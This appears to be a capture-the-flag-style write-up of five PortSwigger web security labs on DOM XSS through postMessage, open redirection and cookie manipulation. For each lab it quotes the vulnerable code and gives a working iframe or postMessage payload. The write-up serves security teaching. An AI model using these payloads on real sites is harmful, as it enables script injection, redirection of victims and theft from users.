### 1. DOM XSS using web messages
**Objective**: This lab demonstrates a simple web message vulnerability. To solve this lab, use the exploit server to post a message to the target site that causes the print() function to be called.<br>
Below is the snippet code we found in application home page while trying to view using View Page source.
```js
<!-- Ads to be inserted here -->
<div id='ads'>
</div>
<script>
    window.addEventListener('message', function(e) {
      document.getElementById('ads').innerHTML = e.data;
  })
</script>
```
#### Problems Identified
1. The message event listener triggers whenever any script on any webpage sends a message to your window using postMessage(). Because the code doesn't check e.origin to verify who sent the message, an attacker can host a malicious website, open your site in an iframe (or a popup), and blast harmful data straight into your listener.
2.  The code uses .innerHTML to insert e.data directly into the webpage. innerHTML doesn't just render text; it parses and executes HTML and JavaScript.<br>
Host the below script on attacker server to have XSS.
```js
// The attacker opens your vulnerable site
const targetWindow = window.open("https://your-vulnerable-site.com");
// The attacker sends a malicious payload disguised as data
targetWindow.postMessage("<img src=x onerror=alert('Hacked!')>", "*");
```
Use the below one to solve the lab.
```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
```
When the iframe loads, the postMessage() method sends a web message to the home page. The event listener, which is intended to serve ads, takes the content of the web message and inserts it into the div with the ID ads.
###  2. DOM XSS using web messages and a JavaScript URL
**Objective**: This lab demonstrates a DOM-based redirection vulnerability that is triggered by web messaging. To solve this lab, construct an HTML page on the exploit server that exploits this vulnerability and calls the print() function.<br>
Below is the snippet code we found in application home page while trying to view using View Page source.
```js
 <script>
   window.addEventListener('message', function(e) {
     var url = e.data;
     if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
       location.href = url;
     }
   }, false);
 </script>
```
* The window.addEventListener('message', ...) function listens for Cross-Origin Communication (postMessage). Anyone can send a message to this window from an external site or an embedded iframe. The code takes e.data (the incoming message) and directly assigns it to location.href.
* The if statement attempts to validate the URL, but the logic is flawed: indexOf('http:') > -1 only checks if the string contains http:. It does not ensure the string starts with it, nor does it check the actual domain name.

To solve the lab you can host the below exploit on attacker's server.
```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
```
### 3. DOM XSS using web messages and JSON.parse
**Objective**: This lab uses web messaging and parses the message as JSON. To solve the lab, construct an HTML page on the exploit server that exploits this vulnerability and calls the print() function.<br>
Below is the snippet code we found in application home page while trying to view using View Page source.
```js
<script>
  window.addEventListener('message', function(e) {
    var iframe = document.createElement('iframe'),
      ACMEplayer = {
        element: iframe
      },
      d;
    document.body.appendChild(iframe);
    try {
      d = JSON.parse(e.data);
    } catch (e) {
      return;
    }
    switch (d.type) {
      case "page-load":
        ACMEplayer.element.scrollIntoView();
        break;
      case "load-channel":
        ACMEplayer.element.src = d.url;
        break;
      case "player-height-changed":
        ACMEplayer.element.style.width = d.width + "px";
        ACMEplayer.element.style.height = d.height + "px";
        break;
    }
  }, false);
```
* The code sets up an event listener for message events. Any window (like an iframe, a popup, or an external site that opens this page) can use window.postMessage() to send data to this listener.
* The code completely skips checking e.origin. Because there is no check, any website on the internet can embed this page in an iframe and send it a malicious message.
* Sinks (Dangerous Assignments): The code takes data directly from the message payload (d.url) and assigns it straight to a dangerous JavaScript property (a "sink"):
```html
case "load-channel":
  ACMEplayer.element.src = d.url; // <-- The Sink
  break;
```
Howevever to trigger the XSS the data type should be load-channel. Lets craft the payload now.
```html
<iframe src=https://YOUR-LAB-ID.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
```
### 4. DOM-based open redirection
**Objective**: This lab contains a DOM-based open-redirection vulnerability. To solve this lab, exploit this vulnerability and redirect the victim to the exploit server.<br>
Below is the snippet code we found in application home page while trying to view using View Page source.
```html
<a href='#' onclick='returnUrl = /url=(https?:\/\/.+)/.exec(location); location.href = returnUrl ? returnUrl[1] : "/"'>Back to Blog</a>
```
This code is vulnerable to a DOM-based open redirect because it extracts a URL directly from the user's browser address bar (location) and immediately instructs the browser to navigate to that URL without validating where it goes. You can add url parameter in browser address bar on this page and then click on 'Back to Blog<' hyperlink in the page.
### 5. DOM-based cookie manipulation
**Objective**: This lab demonstrates DOM-based client-side cookie manipulation. To solve this lab, inject a cookie that will cause XSS on a different page and call the print() function. You will need to use the exploit server to direct the victim to the correct pages.<br>
Below is the snippet code we found in application home page while trying to view using View Page source.
```js
<script>
  document.cookie = 'lastViewedProduct=' + window.location + '; SameSite=None; Secure'
</script>
```
This code is vulnerable to DOM-based Cookie Manipulation because it takes the entire, uncleaned URL directly from the address bar (window.location) and appends it straight into document.cookie. Many web applications read cookies later to customize the page user interface (e.g., displaying a username, language preference, or "last viewed item"). Below is the payload you can use to trigger DOM based XSS.
```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://YOUR-LAB-ID.web-security-academy.net';window.x=1;">
```
The original source of the iframe matches the URL of one of the product pages, except there is a JavaScript payload added to the end. When the iframe loads for the first time, the browser temporarily opens the malicious URL, which is then saved as the value of the lastViewedProduct cookie. The onload event handler ensures that the victim is then immediately redirected to the home page, unaware that this manipulation ever took place. While the victim's browser has the poisoned cookie saved, loading the home page will cause the payload to execute.
